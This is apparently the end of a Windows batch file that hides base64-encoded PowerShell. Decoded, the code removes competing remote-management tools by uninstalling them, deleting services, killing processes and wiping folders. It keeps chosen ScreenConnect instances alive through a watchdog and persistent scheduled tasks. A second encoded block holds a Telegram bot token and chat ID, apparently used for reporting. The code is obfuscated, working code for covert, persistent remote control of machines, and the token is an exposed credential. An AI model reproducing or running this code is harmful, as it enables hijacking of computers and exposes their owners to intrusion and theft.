U3ZjPUAoJ05hdmVyaXNrKicpOyBQcm9jPUAoJ05hdmVyaXNrKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXE5hdmVyaXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE5hdmVyaXNrIik7
IFByb2Q9QCgnTmF2ZXJpc2sqJykgfQogICAgICAgIEB7IFRhZz0nSW1teUJvdCc7ICAgICAgU3Zj
PUAoJ0ltbXlCb3QqJywnSW1teSonKTsgUHJvYz1AKCdJbW15QWdlbnQqJywnSW1teUJvdConKTsg
RGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xJbW15Qm90IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XEltbXlCb3QiLCIkZW52OlByb2dyYW1EYXRhXEltbXlCb3QiKTsgUHJvZD1AKCdJbW15Qm90
KicpIH0KICAgICAgICBAeyBUYWc9J0F1dG9tb3gnOyAgICAgIFN2Yz1AKCdhbWFnZW50KicsJ0F1
dG9tb3gqJyk7IFByb2M9QCgnYW1hZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xB
dXRvbW94IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dG9tb3giLCIkZW52OlByb2dyYW1E
YXRhXGFtYWdlbnQiKTsgUHJvZD1AKCdBdXRvbW94KicpIH0KICAgICAgICBAeyBUYWc9J0Fjcm9u
aXNDeWJlcic7IFN2Yz1AKCdBY3JvbmlzKicpOyBQcm9jPUAoJ2Fjcm9jbWQqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcQWNyb25pcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Jv
bmlzIik7IFByb2Q9QCgnQWNyb25pcyBDeWJlcionLCdBY3JvbmlzIEFnZW50KicsJ0N5YmVyIFBy
b3RlY3QgQWdlbnQqJykgfQogICAgICAgIEB7IFRhZz0nRG9tb3R6JzsgICAgICAgU3ZjPUAoJ0Rv
bW90eionKTsgUHJvYz1AKCdEb21vdHoqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcRG9t
b3R6IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERvbW90eiIpOyBQcm9kPUAoJ0RvbW90eion
KSB9CiAgICAgICAgQHsgVGFnPSdBdXZpayc7ICAgICAgICBTdmM9QCgnQXV2aWsqJyk7IFByb2M9
QCgnQXV2aWsqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQXV2aWsiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cQXV2aWsiKTsgUHJvZD1AKCdBdXZpayonKSB9CiAgICAgICAgQHsgVGFn
PSdCYXJyYWN1ZGFSTU0nOyBTdmM9QCgnQmFycmFjdWRhKicpOyBQcm9jPUAoJ01XU2VydmljZSon
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xCYXJyYWN1ZGEiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cQmFycmFjdWRhIiwiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwgUGxhdGZvcm1zIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExldmVsIFBsYXRmb3JtcyIpOyBQcm9kPUAoJ0JhcnJh
Y3VkYSBSTU0qJywnTWFuYWdlZCBXb3JrcGxhY2UqJykgfQogICAgICAgIEB7IFRhZz0nR292ZXJs
YW4nOyAgICAgU3ZjPUAoJ0dvdmVybGFuKicpOyBQcm9jPUAoJ2dvdmVybGFuKicsJ2dvdmFnZW50
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvdmVybGFuIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XEdvdmVybGFuIik7IFByb2Q9QCgnR292ZXJsYW4qJykgfQogICAgICAgIEB7IFRh
Zz0nUERRJzsgICAgICAgICAgU3ZjPUAoJ1BEUSonKTsgUHJvYz1AKCdQRFFSdW5uZXIqJywnUERR
SW52ZW50b3J5KicsJ1BEUURlcGxveSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZG1p
biBBcnNlbmFsIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkbWluIEFyc2VuYWwiLCIkZW52
OlByb2dyYW1GaWxlc1xQRFEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUERRIik7IFByb2Q9
QCgnUERRIERlcGxveSonLCdQRFEgSW52ZW50b3J5KicsJ1BEUSBDb25uZWN0KicpIH0KICAgICkK
CiAgICBmb3JlYWNoICgkdG9vbCBpbiAkcm1tKSB7CiAgICAgICAgJGhpdCA9ICRmYWxzZQogICAg
ICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wuUHJvZCkgewogICAgICAgICAgICBmb3JlYWNoICgk
cm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7CiAgICAgICAgICAgICAgICBHZXQtQ2hp
bGRJdGVtICRyb290IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmpl
Y3QgewogICAgICAgICAgICAgICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0
aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUKICAgICAgICAgICAg
ICAgICAgICBpZiAoJGRuIC1hbmQgJGRuIC1saWtlICRwYXQpIHsKICAgICAgICAgICAgICAgICAg
ICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRkbikgeyBMb2cgInJtbV9za2lwX2RhdHRvX2tlZXAg
WyRkbl0iOyByZXR1cm4gfQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoVW5pbnN0YWxsLVBy
b2R1Y3RLZXkgJF8pIHsgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZSB9CiAgICAgICAgICAgICAgICAg
ICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZv
cmVhY2ggKCRwYXQgaW4gJHRvb2wuU3ZjKSB7CiAgICAgICAgICAgIEdldC1TZXJ2aWNlIC1OYW1l
ICRwYXQgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAg
ICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJF8uTmFtZSAtb3IgSXMtRGF0dG9LZWVw
ZXIgJF8uRGlzcGxheU5hbWUpIHsgTG9nICJybW1fc2tpcF9kYXR0b19zdmMgJCgkXy5OYW1lKSI7
IHJldHVybiB9CiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBzdG9wICIkKCRfLk5hbWUpIiAyPiYx
IHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1NaWxsaXNlY29uZHMgNTAw
CiAgICAgICAgICAgICAgICAmIHNjLmV4ZSBkZWxldGUgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQt
TnVsbAogICAgICAgICAgICAgICAgJG4ucm1tKys7ICRoaXQgPSAkdHJ1ZTsgTG9nICJybW1fc3Zj
X2RlbGV0ZWQgJCgkXy5OYW1lKSBbJCgkdG9vbC5UYWcpXSIKICAgICAgICAgICAgfQogICAgICAg
IH0KICAgICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2MpIHsKICAgICAgICAgICAgR2V0
LVByb2Nlc3MgLU5hbWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVh
Y2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIFN0b3AtUHJvY2VzcyAtSWQgJF8uSWQgLUZvcmNl
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsg
JGhpdCA9ICR0cnVlOyBMb2cgInJtbV9wcm9jX2tpbGxlZCAkKCRfLlByb2Nlc3NOYW1lKSBbJCgk
dG9vbC5UYWcpXSIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBmb3JlYWNoICgkZCBp
biAkdG9vbC5EaXJzKSB7CiAgICAgICAgICAgIGlmICgkZCAtYW5kIChUZXN0LVBhdGggLUxpdGVy
YWxQYXRoICRkKSkgewogICAgICAgICAgICAgICAgaWYgKElzLURhdHRvS2VlcGVyICRkKSB7IExv
ZyAicm1tX3NraXBfZGF0dG9fZGlyICRkIjsgY29udGludWUgfQogICAgICAgICAgICAgICAgaWYg
KEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5ybW0rKzsgJGhpdCA9ICR0cnVlOyBMb2cgInJtbV9k
aXJfcmVtb3ZlZCAkZCIgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJy
bW1fZGlyX1JFTU9WRV9GQUlMRUQgJGQiIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAg
ICBpZiAoJGhpdCkgeyBMb2cgInJtbV9leHRlcm1pbmF0ZWQgJCgkdG9vbC5UYWcpIiB9CiAgICB9
CgogICAgJHN1bW1hcnkgPSAiZXh0ZXJtaW5hdGUgc3ZjPSQoJG4uc3ZjKSBwcm9jPSQoJG4ucHJv
YykgZGlyPSQoJG4uZGlyKSBwcm9kdWN0PSQoJG4ucHJvZHVjdCkgcm1tPSQoJG4ucm1tKSBmYWls
PSQoJG4uZmFpbCkiCiAgICBMb2cgJHN1bW1hcnkKICAgIHJldHVybiAkc3VtbWFyeQp9CgpmdW5j
dGlvbiBVcGRhdGUtU3RhdGUgewogICAgJGtlZXAgPSBAKEdldC1LZWVwRmluZ2VycHJpbnRzKQog
ICAgJGdyeXhhRnAgPSBHZXQtR3J5eGFGcAogICAgJHByaW0gPSAkbnVsbDsgJGFsdCA9ICRudWxs
OyAkc2NyaXB0OmdyeXhhID0gJG51bGwKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNl
IC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUg
LW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgIGlmICgkbWF0Y2hlc1sx
XSAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAg
ICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAk
YWx0ID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0g
LWVxICRncnl4YUZwKSB7ICRzY3JpcHQ6Z3J5eGEgPSAiJCgkc3ZjLlN0YXR1cykiIH0KICAgICAg
ICB9CiAgICB9CiAgICAkZm9yZWlnbiA9IEAoKQogICAgZm9yZWFjaCAoJHN2YyBpbiAoR2V0LVNl
cnZpY2UgLU5hbWUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicpKSB7CiAgICAgICAgaWYgKCRzdmMu
TmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZdezE2fSlcKScgLWFuZCAkbWF0Y2hlc1sxXSAtbm90aW4g
JGtlZXApIHsKICAgICAgICAgICAgJGZvcmVpZ24gKz0gJG1hdGNoZXNbMV0KICAgICAgICB9CiAg
ICB9CiAgICAkaWQgPSBSZWFkLUlkZW50aXR5CiAgICAkdGFza3NPayA9IDA7ICR0YXNrc1RvdGFs
ID0gMAogICAgZm9yZWFjaCAoJGsgaW4gJ1RBU0tfQScsJ1RBU0tfQicsJ1RBU0tfQycsJ1RBU0tf
RCcpIHsKICAgICAgICAkdGFza3NUb3RhbCsrCiAgICAgICAgJHRuID0gTm9ybWFsaXplLVRhc2tO
YW1lIChbc3RyaW5nXSRpZFska10pCiAgICAgICAgaWYgKC1ub3QgJHRuKSB7IGNvbnRpbnVlIH0K
ICAgICAgICAkbWFya2VyID0gaWYgKCRrIC1lcSAnVEFTS19CJykgeyAnZXRsX21vbi5jbWQnIH0g
ZWxzZSB7ICdvd25fbW9uLmNtZCcgfQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4g
JG1hcmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRtYXJrZXIpKSB7ICR0YXNr
c09rKysgfQogICAgfQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgJE1vblBhdGggPSBKb2luLVBh
dGggJFdvcmtEaXIgJ293bl9tb24uY21kJyB9CiAgICAkd2QgPSBFbnN1cmUtV2F0Y2hkb2cKICAg
ICRwcmV2ID0gQHt9CiAgICAkc3RhdGVQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdzdGF0ZS5q
c29uJwogICAgaWYgKFRlc3QtUGF0aCAkc3RhdGVQYXRoKSB7CiAgICAgICAgdHJ5IHsgKEdldC1D
b250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoIC1SYXcgfCBDb252ZXJ0RnJvbS1Kc29uKS5Q
U09iamVjdC5Qcm9wZXJ0aWVzIHwgRm9yRWFjaC1PYmplY3QgeyAkcHJldlskXy5OYW1lXSA9ICRf
LlZhbHVlIH0gfSBjYXRjaCB7fQogICAgfQogICAgJGluc3RhbGxDb3VudCA9IDEKICAgIGlmICgk
cHJldi5pbnN0YWxsQ291bnQpIHsgJGluc3RhbGxDb3VudCA9IFtpbnRdJHByZXYuaW5zdGFsbENv
dW50IH0KICAgIGlmICgkcHJldi5wcmltIC1hbmQgJHByZXYucHJpbSAtbmUgJ1J1bm5pbmcnIC1h
bmQgJHByaW0gLWVxICdSdW5uaW5nJykgeyAkaW5zdGFsbENvdW50KysgfQogICAgJHN0YXRlID0g
W29yZGVyZWRdQHsKICAgICAgICBob3N0ICAgICAgICAgPSAkZW52OkNPTVBVVEVSTkFNRQogICAg
ICAgIHRzICAgICAgICAgICA9IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9TdHJpbmco
J28nKQogICAgICAgIGJ1aWxkICAgICAgICA9ICRCdWlsZAogICAgICAgIHByaW0gICAgICAgICA9
ICQoaWYgKCRwcmltKSB7ICRwcmltIH0gZWxzZSB7ICdNSVNTSU5HJyB9KQogICAgICAgIGFsdCAg
ICAgICAgICA9ICQoaWYgKCRhbHQpIHsgJGFsdCB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAg
ICBncnl4YSAgICAgICAgPSAkKGlmICgkc2NyaXB0OmdyeXhhKSB7ICRzY3JpcHQ6Z3J5eGEgfSBl
bHNlIHsgJ01JU1NJTkcnIH0pCiAgICAgICAgZ3J5eGFGcCAgICAgID0gJGdyeXhhRnAKICAgICAg
ICBmb3JlaWduICAgICAgPSAkZm9yZWlnbgogICAgICAgIHRhc2tzT2sgICAgICA9ICR0YXNrc09r
CiAgICAgICAgdGFza3NUb3RhbCAgID0gJHRhc2tzVG90YWwKICAgICAgICB3YXRjaGRvZyAgICAg
PSAkd2QKICAgICAgICBpbnN0YWxsQ291bnQgPSAkaW5zdGFsbENvdW50CiAgICAgICAgbGFzdEhl
YWwgICAgID0gJChpZiAoJEV4dHJhKSB7IChHZXQtRGF0ZSkuVG9Vbml2ZXJzYWxUaW1lKCkuVG9T
dHJpbmcoJ28nKSB9IGVsc2VpZiAoJHByZXYubGFzdEhlYWwpIHsgJHByZXYubGFzdEhlYWwgfSBl
bHNlIHsgJG51bGwgfSkKICAgICAgICBub3RlICAgICAgICAgPSAkRXh0cmEKICAgIH0KICAgICgk
c3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MpIHwgU2V0LUNvbnRlbnQgLUxpdGVyYWxQ
YXRoICRzdGF0ZVBhdGggLUZvcmNlCiAgICByZXR1cm4gJHN0YXRlCn0KCnN3aXRjaCAoJEFjdGlv
bikgewogICAgJ2luaXQnICAgICAgICAgICAgeyAkaWQgPSBJbml0aWFsaXplLUlkZW50aXR5OyAk
aWQuR2V0RW51bWVyYXRvcigpIHwgRm9yRWFjaC1PYmplY3QgeyAiJCgkXy5LZXkpPSQoJF8uVmFs
dWUpIiB9IH0KICAgICdpZGVudGl0eScgICAgICAgIHsgJGlkID0gUmVhZC1JZGVudGl0eTsgJGlk
LkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZhbHVl
KSIgfSB9CiAgICAnd2F0Y2hkb2cnICAgICAgICB7IEluc3RhbGwtV2F0Y2hkb2cgfCBPdXQtTnVs
bCB9CiAgICAnd2F0Y2hkb2ctZW5zdXJlJyB7IEVuc3VyZS1XYXRjaGRvZyB9CiAgICAndGFza3Mt
ZW5zdXJlJyAgICB7IEVuc3VyZS1QZXJzaXN0VGFza3MgfQogICAgJ3N0YXRlJyAgICAgICAgICAg
eyBVcGRhdGUtU3RhdGUgfCBDb252ZXJ0VG8tSnNvbiAtQ29tcHJlc3MgfQogICAgJ3JlcGFpcicg
ICAgICAgICAgeyBSZXBhaXItU0NTZXJ2aWNlICRGcCB9CiAgICAncmVnaXN0ZXJlZCcgICAgICB7
IFRlc3QtU0NSZWdpc3RlcmVkICRGcCB9CiAgICAnZXh0ZXJtaW5hdGUnICAgICB7IEludm9rZS1F
eHRlcm1pbmF0ZSB9CiAgICAnZ3J5eGEtaGVhbHRoJyAgICB7IFRlc3QtR3J5eGFIZWFsdGggfQog
ICAgJ2dyeXhhLWVuc3VyZScgICAgeyBJbnZva2UtR3J5eGFFbnN1cmUgfQp9Cg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcK
Q0hBVF9JRD03NTQ3NDYyMDcwCg==
::B64_NTF_END
